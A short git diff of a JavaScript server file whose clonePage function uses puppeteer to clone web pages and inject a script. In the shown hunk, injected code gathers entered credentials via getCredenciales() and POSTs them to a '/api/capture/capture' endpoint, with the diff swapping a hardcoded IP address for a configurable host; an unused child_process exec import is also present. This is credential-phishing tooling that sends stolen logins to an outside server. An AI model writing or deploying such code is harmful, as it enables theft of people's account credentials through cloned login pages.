@@ -2,6 +2,7 @@ import puppeteer from 'puppeteer';
 import fs from 'fs';
 import path from 'path';
 import { exec } from 'child_process'; // PRUEBA
+import { HOST } from '../config/configEnv';
 
 export const clonePage = async (req, res) => {
     try {
@@ -51,7 +52,7 @@ export const clonePage = async (req, res) => {
 
                 function enviarCredenciales() {
                     const data = getCredenciales();
-                    fetch('http://146.83.198.35:1606/api/capture/capture', {
+                    fetch('http://${HOST}:1606/api/capture/capture', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
